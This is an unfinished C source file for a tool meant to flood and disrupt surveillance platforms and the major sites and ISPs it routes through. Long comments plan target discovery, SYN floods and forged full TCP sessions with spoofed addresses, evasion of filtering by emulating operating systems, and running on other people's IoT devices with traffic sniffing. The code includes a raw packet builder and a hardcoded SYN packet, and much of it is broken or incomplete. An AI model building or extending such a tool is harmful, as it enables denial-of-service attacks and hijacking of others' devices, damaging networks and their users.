/*

this is the main file which takes care of DoS against surveillance platforms worldwide
it is meant to exhaust CPU, memory, and possibly pipes/linked relationships... it will be
three staged (released/versioned) ... first is just to stop connections from being monitored
then itll go further (due to the possible ways to fix that issue) although i plan to release
all possible scenarios as soon as possible.. in other words: plan for every possible fix...
since these hackish systems use fiber taps etc then there will always be a way to disrupt them
and as long as this code continously runs on several machines then ... no more surveillance

*/

/*
discovery:
all major sites (prism related, facebook, those kinds) in a list
DNS them all.. and begin to reverse their ranges, and analyze traceroutes to find ones with same hops
to ensure its either in the same datacenter, or closse to it

for DNS it should randomize between google, and other top providers an dthe local provider (it can attempt to DNS fromm all
local hosts as a third of its requests)

generate residential IPs using geoip

generate business IPs using geoip (and a list of worldwide isp providers)

IANA/whois info could be used (but dont put code to look anything up)

attack:
stsage 1 - syn (not virtual connections) floods using alll of the ranges (but we can virtualize a respoonse from the server
so that it takes up a structure inside of the surveillance platforms)
their first response will be to count a few packets such as 5 before it prioritizes so this should be variable and increase over time
(increase suuch as falsifying more packets per connection as months go on fromm release)

stage 2-  full blown requests using either local network information regarding top sites (non ssl) but with macros being used
to replace information... most used names can be found easily to be integrated for most languages online (top birth names in countries)
and then terrorists, or lists of government employees either captured from www or local network (libpcaap on these routers since its ioT)
could be used to create automatic local lists of macro replacements for the falsifyed connections


------
at some stage the surveillance systems are going to start randomly accepting connections by some % and only adding them to a permanent
list if they contain actionable intelligence which means that if you declare enough real connections (full sessions) captured and replayed
to autheticate host/ips then it will begin to delegate the falsified ones as well

icmpp messages such as redirect and host not available, ad port not available could also affect these serviecs

-----

*/
/*
geoip [ 

    residential finder - generate & verify IPs within particular countries (first world, high intelligene gathering, etc)

    business IP finders - generate & verify ips in certain industries.. whois/http/dns (dfense, cyber, ads, etc)

    corporate discovery - generate ips for facebook, google, microsoft, etc (all past prism/major online resources, and expected ones now)
    (top few thousands websites should be enough)
]

geoip = 6megs default

posssible to extract top countries out of the database and use solely those.. it should lower it to below a megabyte
and using our own algorithm would help even further



dns (host -t MX, NS, etc) for top sites (to generate enough connections to overrun their capturing scenarios for mail,etc)



traceroute (to ensure it goes through enough hops for the hosts that were generated) which meaans itll pass through the fiber
needss to vereify both sides, source and dest.. then 1 single box can attack and due to rouutinng, bgp and world wide
itll work just as fine as having two boxes working together on other parts of the world

picking hosts near the dest/source host might be smart as well..to ensure it doesnt give away information to these systems
in case they use this tracing scenario to attempt to block or mitigate these attackers


list of protocols
http smtp pop ssl vpn smtp ssh dns (each need to be equally hit to ensure it funnctions for all NSA selectors fromm leaks)

packet generators (lots around)
syn flood, virtual tcp connections (much eaier now that we do not need both sides of the tap)



*/

#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <getopt.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <fcntl.h>
#include <resolv.h>
#include "structs.h"
#include <list.h>
#include "utils.h"
#include "anti_surveillance.h"


// queue for futher requests to the DNS lookup which will populate IPs for major sites, and corporations
// it should find mail servers, name servers, and other IPs related to these companies which  are different
// from the front facing sites
// it should also allow a spider once these ips are done being used or increase (over months or time) to automatically
// spider the IPs, and reverse then continue adding all ranges/data centers related
// this would allow the software to adapt to how governments will begin to block this attack
// depending on intelligence lost they may attempt to block quickly but id expect it shoud increase by 3-6months
// for spidering all geoip data centers for every major site

// thiis should also lookup residential IPs generated in countries using geoip...
// this information should be cached so the same IoT bot doesnt have to continously look it up
// a system for distributing over p2p could work for this as well but it should verify 10% and immediately
// disqualify p2p if it finds someone is attempting to infect it wiith bad information
// inn that case, they could all scan IPv4 ranges for open DNS servers (simple to do) and then
// share sevveral, or find their own and attempt to get real results

// also it could automaticallly scan and find dns servers in geoip regions to ensure it obtains the correct data centers
// for appllying the attack to that region

enum {
        // can auto append www. to most just to grab that
        DNS_WWW,
        DNS_MX,
        DNS_NS,
        DNS_A,
        DNS_PTR    
};

// one single dns record (response about a hostname, prepared to stay on record)
// it can be reused for preparing further attacks against the same sites, etc
// using different residential, or business ip addresses
typedef struct _dns_record {
    struct _dns_record *next;
    // raw response..
    unsigned char *response;
    int response_size;

    unsigned char type; // enums from before

    uint32_t ipv4;
    uint64_t ipv6;

    // ts of last lookup
    int ts;

    int country_id;
} DNSRecord;


typedef struct _lookup_queue {
    struct _lookup_queue *next;

    char *hostname;

    // spider would be for using different dns servers in different geos
    // it allows using geo ips which look more legit
    // one of the first responses to these attacks will be to filter the attacks out
    // using scenarios like this...
    struct _lookup_queue *spider;
    struct _lookup_queue *recursive;

    // is this queue complete? (it wouuld mean that all recursive/spider are completed as well)
    int complete;
    int ipv6;

    // how many responses? (different geos, etc)
    int count;
    int ts;

    DNSRecord **responses;
} DNSQueue;

// queued dns requests (getting prepared to go to wire)
DNSQueue *dns_queue = NULL;

// responsses from DNS requests which can be used for future attacks on particular sites such as facebook, etc
DNSRecord *dns_records = NULL;


// dns (MX, NS, PTR, etc)
//https://stackoverflow.com/questions/1093410/pulling-mx-record-from-dns-server
// ensure it works across all IoT and systems


int main (int argc, char *argv[])
{
    u_char nsbuf[4096];
    char dispbuf[4096];
    ns_msg msg;
    ns_rr rr;
    int i, j, l;

    if (argc < 2) {
        printf ("Usage: %s <domain>[...]\n", argv[0]);
        exit (1);
    }

    for (i = 1; i < argc; i++) {
        l = res_query (argv[i], ns_c_any, ns_t_mx, nsbuf, sizeof (nsbuf));
        if (l < 0) {
            perror (argv[i]);
        } else {
#ifdef USE_PQUERY
/* this will give lots of detailed info on the request and reply */
            res_pquery (&_res, nsbuf, l, stdout);
#else
/* just grab the MX answer info */
            ns_initparse (nsbuf, l, &msg);
            printf ("%s :\n", argv[i]);
            l = ns_msg_count (msg, ns_s_an);
            for (j = 0; j < l; j++) {
                ns_parserr (&msg, ns_s_an, j, &rr);
                ns_sprintrr (&msg, &rr, NULL, NULL, dispbuf, sizeof (dispbuf));
                printf ("%s\n", dispbuf);
            }
#endif
        }
    }

    exit (0);
}

enum {
    ATTACK_SYN,
    ATTACK_SESSION,
    ATTACK_END
};


typedef struct _pkt_info {
    struct _pkt_info *next;

    int type;

    // for future (wifi raw, etc)
    //int layer;

    char *buf;
    int size;

    // processed using functions to replace locally captured sessions
    // with other names
    int prepared; // macros, etc

    // this src/dst matters most only if the prior structure is using 0
    uint32_t src;
    uint32_t dst;
} PacketInfo;


// research information is required for various aaspects of this...
// traceroute information, dns, 
typedef struct _research_info {
    struct _research_info *next;

    uint32_t addr;
    char *hostname;

    // we need to be able to compaare hops between different sources, and destinations
    int traceroute_hops;

    // dns records
    DNSRecord *dns;


} ResearchInfo;

ResearchInfo *research_list = NULL;


// general attack structure...
// should support everything from syn packets, to virtual connections
typedef struct _as_attacks {
    struct _as_attacks *next;

    // what kind of attack is this? syn only? spoofed full sessions..
    int type;

    // src / dest matters only if the box is expectinng to be handled on both sides of the tap
    // if its 0 then it will go along with the packet structures
    uint32_t src;
    uint32_t dst;

    // state / id of current packet
    int send_state;
    int recv_state;

    // packets being used for send states, or whatever other circumstances
    PacketInfo *packets;

    // do we repeat this attack again whenever its completed?
    int count;
    int repeat_interval;

    // if it has a count>0 then completed would get set whenever
    int completed;

    // function which sets up the attack
    // such as building packets, and pushing to outgoing queue
    attack_func function;
} AS_attacks;

AS_attacks *attack_list = NULL;

// this is the queue which shouldnt have anything to do with processing, or other functions.. its where
// all attacks go to get submitted directly to the wire.. 
typedef struct _attack_outgoing_queue {
    struct _attack_outgoing_queue *next;

    AS_attacks *attack_info;

    char buf;
    int size;
} AttackOutgoingQueue;

// this is flushed to wire as quickly as possible...
// this allows using a separate thread to ensure speed is fast enough
// in that case we shouldnt affect the attack_info from another thread
// without mutex, etc but it might not be worth it
AttackOutgoingQueue *wire_queue = NULL;


/*

this will put a packet (needs eth frame for this operation) directly into outgoing queue
ok so one thing to consider in the future
its possible that 2 packets of the same attack get sent too close together... itd be nice to have them separated by frames
it might be smart to use an array when adding where one outgoing queue will move the next one into the current positon after
it flushes hte buffer.. for now i wont deal with it... but it can either be done by
adding a variable with a wait count (one loop each decrement) before it sends the packet so it can
queue future packets which wonot get sent till next iteratioon.. ill work this out in a bit
i dont think its important until the analysis parts of attempting to block the attacks come into pllay
ive pretty much thought of every possible way to fix all of these attacks, and ... its impossible to solve for good.

*/
int AS_queue(char *buf, int size, AS_attacks *attack) {
    AttackOutgoingQueue *optr = NULL;

    if ((optr = (AttackOutgoingQueue *)calloc(1,sizeof(AttackOutgoingQueue)) == NULL)
        return -1;
    
    // we pass the pointer so its not going to use CPU usage to copy it again...
    // the calling function should release the pointer (set to NULL) so that it doesnt
    // free it too early
    optr->buf = buf;
    optr->size = size;
    optr->attack_info = attack;

    return 1;
}


// *** strategy for repeat_interval needs to be worked into an algorithm taking considering of how long this system is released
// it needs to progressively use more resources over time
// this isnt just for a simple SYN (one packet trying to open a port)
// depth will allow to go the entire handshake... 
// the point is initially that the systems wont be prepared for these kinds of attacks...
// but a start date will get put in (prob nov 4-5) which will be the date fromm when the depth will be calculated
// after full connectioons are established (depth = 3) then it will rely on virtual connections as well
int AS_session_queue(uint32_t src, uint32_t dst, int count, int interval, int depth) {
    AS_attacks *aptr = NULL;

    aptr = (AS_attacks *)calloc(1, sizeof(AS_attacks));
    if (aptr == NULL)
        return -1;

    aptr->src = src;
    aptr->dst = dst;
    aptr->type = ATTACK_SESSION;
    aptr->count = count;
    aptr->repeat_interval = interval;

    aptr->next = attack_list;
    attack_list = aptr;

    return 1;
}


// perform one iteration of each attack
int AS_perform() {
    AS_attacks *aptr = attack_list;

    while (aptr != NULL) {

        // call the correct function for performing this attack
        aptr->attack_func(aptr);

        aptr = aptr->next;
    }

    return 1;
}


/* took some packet forging stuff I found online, and modified it...
   It was better than my wireshark -> C array dumping w memcpy... trying to hack this together as quickly as possible isnt fun :)

   /*!	forgetcp.c
 * 	\Brief Generate TCP packets
 * 	\Author jve
 * 	\Date  sept. 2008
*/



#define PSEUDOTCPHSIZE	12
// base ip header size (without options)
#define IPHSIZE		20

// pseudo structure for calculating checksum
struct pseudo_tcp
{
	unsigned saddr, daddr;
	unsigned char mbz;
	unsigned char ptcl;
	unsigned short tcpl;
	struct tcphdr tcp;
};

// this is goiong to be a global structure which allows context information to stay valid so
// multiple packets ccan be built in order without having to return pointers, and increasing memory utilizations etc
// be sure to zero this on initial packet..
struct _pkt_building_context {
    uint32_t ack;
    uint32_t seq;
    uint32_t src_id;
    uint32_t dst_id;
    int emulated_operating_system;
    // we want to begin to log counter information for emulated operating systems...
    // we have to do ur best to ensure nothing is left to catch these packets
    int last_pkt_len[1]; // depending on source/dest .. we will keep both since we are building entire sessions
} PacketBuildContext;

// packet header.. options go after tcphdr.. i havent used iphdr so oh well
struct packethdr
{
	struct iphdr ip;
    struct tcphdr tcp;
    // lets add 1500 since its the default MTU...
    // its used for putting the options after the tcp header.. and data as well...
    // its easier sinnce the size is being used in many places rather than allocating, and copying
    // when our goal is for speed to deliver packets per second
    char data[1500];
};

enum {
    TCP_WANT_CONNECT,
    TCP_CONNECT_OK,
    TCP_ESTABLISHED,
    TCP_TRANSFER,
    TCP_END
};


unsigned char *build_tcp_packet(uint32_t src, uint32_t dst, int src_port, int dst_port, int type, char *data, int data_size) {
    unsigned char *final_packet = NULL;
    int final_packet_size = 0;
    struct packet p;
   	// options are here static.. i need to begin to generate the timestamp because that can be used by surveillance platforms
	// to attempt to weed out fabricated connections ;) i disabled it to grab this raw array
    unsigned char options[12] = {0x02, 0x04,0x05, 0xb4, 0x01, 0x01, 0x04, 0x02, 0x01, 0x03,0x03, 0x07};
    // this is preparing for when we have dynamic options...
    char *current_options = (char *)options;
    int current_options_size = 12;
    // base tcp header size (without options, which are used for establishing the handshake for opening the connection)
    int TCPHSIZE = 20;


    memset(&p, 0x0, sizeof(struct packet));


    // ip header.. 
	p.ip.version 	= 4;
	p.ip.ihl 	= IPHSIZE >> 2;
	p.ip.tos 	= 0;
	
    // thiis id gets incremented similar to ack/seq (look into further later)
    // it must function properly like operating systems (windows/linux emulation needed)
    // itll take weeks or months to updaate systems to actually search for this and determine differences
    // and thats IF its even possible (due to their implementation having so much more data
    // than possible to log... it must make decisions extremely fast)  ;) NSA aint ready.
    p.ip.id 	= htons(rand()%65535);
    // this can also be used to target the packets... maybe changee options per machine, or randomly after X time
    p.ip.frag_off 	= 0x0040;
    
	p.ip.ttl 	= 0x80;
	p.ip.protocol 	= IPPROTO_TCP;
	p.ip.saddr 	= src;
	p.ip.daddr 	= dst;

    // tcp header
    
    // we want a function to build our ack seq.. it must seem semi-decent entropy.. its another area which
    // can be used later (with a small.. hundred thousand or so array of previous ones to detect entropy kindaa fast
    // to attempt to dissolve issues this system will cause.. like i said ive thought of all possibilities..)
    p.tcp.ack_seq	= htonl(atoi("11111"));
    p.tcp.urg	= 0;
    
    // syn/ack used the most
    p.tcp.syn	= 0;
    p.tcp.ack	= 0;
    // push so far gets used when connection gets established fromo sserver to source
    p.tcp.psh	= 0;
    // fin and rst are ending flags...
    p.tcp.fin	= 0;
    p.tcp.rst	= 0;
    // window needs to also be dynamic with most used variables for operating systems...
    // it should have a dynamic changing mechanism (15-30% for each, and then remove, or add 3-5% every few minutes)
    p.tcp.window	= htons(atoi("16350"));
    
    p.tcp.check	= 0;	/*! set to 0 for later computing */
    
	p.tcp.urg_ptr	= 0;
    
    p.tcp.source = htons(src_port);
    p.tcp.dest = htons(dst_port);


    // play with build packet context.. ensure to keep it proper for the next call to this function which may build its 
    // 2nd,3rd,, 4th , etc packets.. (we will be streaming entire files soon)
    // pretty much everything the older paper mentioned about manipulation of these systems is about to be implemented
    // enjooy that shit.
    p.tcp.seq	= htonl(atoi("99999"));



    if (type == TCP_WANT_CONNECT) {
        p.tcp.syn = 1;
        p.ip.tot_len += current_options_size;
    } else if (type == TCP_CONNECT_OK) {
        // some OS will usse the size of the last packet here...
        // get the emulatioon correct.
        
    } else if (type == TCP_ESTABLISHED) {
        p.tcp.psh = 1;

    }
    
    if (p.tcp.ack == 0) {
        // verify these... if wiresharks accepts it we are OK (until we have to emulate windows, linux, and ios)
        // nmap might have somme information on verifyinng against those..

        p.tcp.ack = ++PacketBuildContext.seq;
    }

    if (p.tcp.seq == 0) {
        p.tcp.seq += data_size;
    }

    TCPHSIZE += current_options_size;
    memcpy(p.data, current_options, current_options_size);
    
    p.ip.tot_len 	= htons(IPHSIZE + TCPHSIZE);
	p.tcp.doff 	= TCPHSIZE >> 2;
    p.ip.tot_len 	= htons(IPHSIZE + TCPHSIZE);
    p.ip.check	= (unsigned short)in_cksum((unsigned short *)&p.ip, IPHSIZE);

    if (p.tcp.check == 0) {
		/*! pseudo tcp header for the checksum computation
		 */
		struct pseudo_tcp p_tcp;
		memset(&p_tcp, 0x0, sizeof(struct pseudo_tcp));

		p_tcp.saddr 	= p.ip.saddr;
		p_tcp.daddr 	= p.ip.daddr;
		p_tcp.mbz 	= 0;
		p_tcp.ptcl 	= IPPROTO_TCP;
		p_tcp.tcpl 	= htons(TCPHSIZE);
		memcpy(&p_tcp.tcp, &p.tcp, TCPHSIZE);

		/*! compute the tcp checksum
		 *
		 * TCPHSIZE is the size of the tcp header
		 * PSEUDOTCPHSIZE is the size of the pseudo tcp header
		 */
        p.tcp.check = (unsigned short)in_cksum((unsigned short *)&p_tcp, TCPHSIZE + PSEUDOTCPHSIZE);
        
	}

    final_packet_size = TCPHSIZE + IPHSIZE + data_size;

    final_packet = (unsigned char *)malloc(1, final_packet_size);
    if (final_packet == NULL) {
        /// leak somewhere.. fuck it
        // we are already executing on foreign IoT environments, or other systems..
        // not about to fix this leak during execution
        exit(-1);
    }

    memcpy(final_packet, &p, final_packet_size);

    // need a way for THIS function to know which is what side f the connection to calculate ack/seq propery
    // especially when emulating different operating systems
    //PacketBuildContext.lasT_packet_value[?] = final_packet_size;

    return final_packet;
    


}

// calculate checksum
unsigned short in_cksum(unsigned short *addr,int len)
{
	register int sum = 0;
	u_short answer = 0;
	register u_short *w = addr;
	register int nleft = len;

        /*!
	* Our algorithm is simple, using a 32 bit accumulator (sum), we add
	* sequential 16 bit words to it, and at the end, fold back all the
	* carry bits from the top 16 bits into the lower 16 bits.
	*/
	while (nleft > 1)  {
		sum += *w++;
		nleft -= 2;
	}

	/*! mop up an odd byte, if necessary */
	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w ;
		sum += answer;
	}

	/*! add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff);     /*! add hi 16 to low 16 */
	sum += (sum >> 16);                     /*! add carry */
	answer = ~sum;                          /*! truncate to 16 bits */
	return(answer);
}





// build the packets, and push to the outgoing wire queue the syn flood packets
int AS_connection_perform(AS_attacks *aptr) {
    char *pkt = NULL;
    int pkt_size = 0;
    int i = 0;

    unsigned char pkt[54] = {   
        // Ethernet 14 bytes
        // destination
        0,0,0,0,0,0,
        // src
        0,0,0,0,0,0,
        // eth type
        0x08, 0x00, 
        
        // ipv4 protocol 20 bytes
        0x45,  // ver 4bits headaer length other 4 bits
        0x00, // diff services 
        0x00, 0x34, // total length
        0x46, 0x2e, // ident
        0x40, // flags
        0x00, // flags+fragment offset
        0x80, // ttl 
        0x06, // protocol: tcp
        0x22, 0x73, // header checksum

        0,0,0,0, // src
        0,0,0,0, // dst
        
        // tcp packet 32 bytes
        0xd5, 0x37, // src port 54583
        0x00, 0x50,  // dst port  80
        
        0x86, 0xa0, 0x14, 0x28,  // seq # 0? relative.. need to randomize this later...
        0x00, 0x00, 0x00, 0x00, // ack  (starts as 0)
        0x80,  // header len 52 bytes + options
        0x02, // flags: syn
        0xfa, 0xf0,  // window size
        0x71, 0xac, // checksum
        0x00, 0x00,  // urgent pointer
    };
    // since options is mainly in the first two packets.. i separated it..so the sequential ones dont have to worry about it
    unsigned char options[20] = {
        0x02,0x04,0x05,0xb4,0x04,0x02,0x08,0x0a,0x53,0xe0,0xc0,0xaa,0x00,0x00,0x00,0x00,
0x01,0x03,0x03,0x07
    };


    if (aptr == NULL)
        return -1;

    // build full connection.. our depth determines
    // how far into the actual GET request we go...
    // its all virtual so no major structures here to perform both sides..
    // just be sure the hop, and research is correct to hurt the taps
    // NSA aint ready.

    
    // edit pkt for wire
    memcpy(&pkt[0], dst_mac, 6);
    memcpy(&pkt[5], src_mac, 6);
    // checksum
    *(unsigned short *)(pkt + 24) = header_checksum;
    memcpy(&pkt[26], src, 4);
    memcpy(&pkt[30], dst, 4);
    // src & dst port
    *(unsigned short *)(pkt + 34) = src;
    *(unsigned short *)(pkt + 36) = dst;
    // sequence & ack
    *(uint32_t *)(pkt + 38) = seq;
    *(uint32_t *)(pkt + 42) = ack;
    
    
    

    // syn from src -> dst

    // syn,ack from dst -> src
    // ack from src -> dst

    // data from src -> dts (get request) -
    //   here is where the trickyness happens...

}